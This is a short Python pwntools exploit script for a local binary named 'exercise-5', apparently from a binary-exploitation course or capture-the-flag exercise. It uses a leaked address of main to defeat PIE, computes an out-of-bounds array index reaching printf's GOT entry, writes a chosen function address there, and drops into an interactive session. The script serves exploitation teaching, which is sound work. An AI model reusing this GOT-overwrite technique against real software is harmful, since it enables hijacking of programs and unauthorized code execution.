#!/usr/bin/python3

# Import everything in the pwntools namespace
from pwn import *

context.binary = './exercise-5'

io = process(context.binary.path)
main = io.unpack()
elf = context.binary
elf.address = main - elf.symbols['main']

function_addr = 0x00000000004018c2
diff = (elf.got['printf'] - elf.symbols['array']) / 8

print("What: 0x%016x" % function_addr)
print("What: %s" % p64(function_addr))
print("Diff: %d" % diff)

for _ in range(8):
    print(io.recvline(timeout=10))
io.sendline(p64(function_addr))
print(io.recvline())
io.sendline(b"two")
for _ in range(11):
    print(io.recvline())
io.sendline(b'0')
print(io.recvline())
io.sendline('%d' % diff)

io.interactive()